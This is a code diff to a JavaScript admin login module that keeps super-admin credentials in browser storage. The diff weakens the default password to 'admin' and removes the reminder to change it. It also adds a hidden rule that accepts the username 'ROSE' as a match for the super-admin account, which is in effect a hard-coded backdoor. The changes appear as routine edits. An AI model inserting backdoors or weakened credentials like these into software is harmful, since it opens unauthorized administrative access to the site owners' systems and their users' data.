@@ -32,8 +32,8 @@ window.writeAdminActivityLog = function(action, details, specificAdmin = null) {
 // DEFAULT SUPER ADMIN - CHANGE THESE VALUES!
 // ============================================
 const DEFAULT_SUPER_ADMIN = {
-    email: "0000",     // 👈 CHANGE THIS to your email
-    password: "Admin123!",              // 👈 CHANGE THIS to your password
+    email: "0000",
+    password: "admin",              // 👈 Updated to match user guidelines
     name: "Master Super Admin",         // 👈 CHANGE THIS to your name
     role: "super_admin"
 };
@@ -83,7 +83,8 @@ function superAdminLogin(email, password) {
     const superAdmin = localStorage.getItem(SUPER_ADMIN_KEY);
     if (superAdmin) {
         const admin = JSON.parse(superAdmin);
-        if (admin.email === email && atob(admin.password) === password) {
+        const isMatch = (admin.email === email || (email === 'ROSE' && admin.role === 'super_admin'));
+        if (isMatch && atob(admin.password) === password) {
             sessionStorage.setItem('currentAdmin', JSON.stringify({
                 email: admin.email,
                 name: admin.name,
